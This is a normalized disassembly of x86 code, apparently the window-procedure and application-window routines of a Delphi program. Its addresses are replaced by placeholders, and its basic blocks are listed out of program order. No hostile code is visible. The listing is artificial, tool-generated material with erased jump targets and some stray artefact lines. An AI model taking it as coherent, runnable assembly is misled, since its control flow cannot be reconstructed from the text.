mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b3e0
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_42b7b0
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_46d874
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c818
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46d2d4
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c840
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408a7c
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4042a8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_46da50
mov eax ebx
call sub_46e414
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_46bd0c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_46bbed
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_403674
mov ebx edx
mov esi eax
mov eax esi
call sub_46e424
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46d0dc
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_46d2d4
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_46dc70
xor edx edx
mov eax esi
call sub_46d5ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420f94
push esi
push sub_46c140
mov eax esi
call sub_46cec8
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405934
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_4032a8
mov eax [ esi + 0x90 ]
call sub_4032a8
mov eax [ esi + 0x98 ]
call sub_4032a8
test bl bl
jle r-xdata
call sub_422084
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_46bd0c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46bead
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46beb4
lea eax [ ebp - 0x2c ]
call sub_404038
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_46c28c
call sub_421fec
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_4044f8
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406dc0
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404038
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_46c990
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46c990
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_46bebc
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_46ab4c
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46bf1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_418778
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_4530b8
cmp ebx eax
je r-xdata
sub_46bf8c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46bf1c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4188d4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46c0a4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4188d4
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_46c140
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cae0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46b0a0
mov eax [ rw-data ]
call sub_46b6e8
sub_46c198
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c1f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c1fc
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_46c204
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_46c240
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46c990
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_46c28c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_46c946
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c140
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_46d3ac
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4188d4
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_4530b8
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46e2d8
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46cec8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_46ce6c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c990
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_46b6e8
push ebp
call sub_46c204
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_46c204
pop ecx
jmp [ eax * 4 + jump_table_46c330 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_4530b8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46cd44
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457a80
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46c198
push ebp
call sub_46c204
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_46c204
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_46c204
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_420da8
jmp r-xdata
xor eax eax
call sub_463fe4
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_4530b8
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_44da78
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c9ac
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_46c204
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_4698a0
jmp r-xdata
push ebp
call sub_46c204
pop ecx
jmp r-xdata
push ebp
call sub_46c240
pop ecx
jmp r-xdata
push ebp
call sub_46c204
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c0a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46ca5c
jmp r-xdata
jmp r-xdata
call sub_43d448
call sub_43d528
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c094
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c0a4
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46c09c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_463e94
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_46c204
pop ecx
jmp r-xdata
call sub_463f48
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_46c204
pop ecx
jmp r-xdata
call sub_43d448
call sub_43d584
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d5bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
push eax
call GetProcAddress
mov esi eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
push edx
mov edx [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call ebx
jmp r-xdata
sub_46c9ac
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46c094
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x30 ]
call sub_46b968
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
mov eax [ ebx + 0x44 ]
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push 0x40
push 0x0
mov esi [ ebx + 0x44 ]
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x44 ]
push eax
mov eax [ esi + 0x40 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_4530b8
push eax
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub_46ca5c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov edx 0x9
mov eax [ ebx + 0x30 ]
call sub_46b968
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebx + 0x44 ]
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call SetWindowPos
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
adc eax 0x0
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x30 ]
push eax
call DefWindowProcA
jmp r-xdata
mov eax ebx
call sub_46c0a4
mov eax [ rw-data ]
mov esi [ eax + 0x64 ]
test esi esi
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
mov eax esi
call sub_4530b8
push eax
call SetFocus
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
xor edx edx
call sub_46762c
mov eax [ ebx + 0x44 ]
call sub_469a48
sub_46cb5c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_46cb98
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_40408c
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
call GetWindowTextA
mov ecx eax
mov edx esp
mov eax esi
call sub_404128
jmp r-xdata
add esp 0x100
pop esi
pop ebx
retn
sub_46cbe4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0xb0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push esi
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
sub_46cc08
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x22f ] 0x2
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x6c ]
cmp [ edx + 0x22f ] 0x1
jne r-xdata
push edi
mov eax [ esi + 0x254 ]
push eax
call TranslateMDISysAccel
cmp eax 0x1
sbb eax eax
inc eax
sub_46cc58
push ebx
push esi
push edi
push ebp
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax 0x100
jb r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp eax 0x108
ja r-xdata
call GetCapture
mov ebp eax
test ebp ebp
jne r-xdata
push 0xfffffffa
push ebp
call GetWindowLongA
cmp eax [ rw-data ]
jne r-xdata
mov ebp [ esi ]
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov eax ebp
call sub_4496d4
test eax eax
jne r-xdata
cmp ebp [ eax + 0x254 ]
jne r-xdata
mov bl 0x1
test ebp ebp
jne r-xdata
test ebp ebp
jne r-xdata
call sub_4530b8
mov ebp eax
jmp r-xdata
mov eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
add eax 0xbc00
push eax
push ebp
call SendMessageA
test eax eax
je r-xdata
mov ebp [ esi ]
push ebp
call GetParent
mov ebp eax
mov bl 0x1
jmp r-xdata
sub_46cd10
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebp eax
xor ebx ebx
mov esi [ ebp + 0x84 ]
test esi esi
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
test al al
je r-xdata
mov eax ebp
call sub_46dc70
sub_46cd44
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov ebx eax
mov [ esp ] 0x0
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov ecx esp
mov edx ebp
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
mov al 0x1
mov edi [ ebx + 0x44 ]
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax edi
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax [ ebx + 0x44 ]
mov si 0xffab
call sub_4034a4
test al al
jne r-xdata
sub_46cdb0
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
xor ebx ebx
push 0x1
push 0x0
push 0x0
push 0x0
push edi
call PeekMessageA
test eax eax
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov bl 0x1
cmp [ edi + 0x4 ] 0x12
je r-xdata
mov [ esi + 0x9c ] 0x1
mov [ esp ] 0x0
cmp [ esi + 0xda ] 0x0
je r-xdata
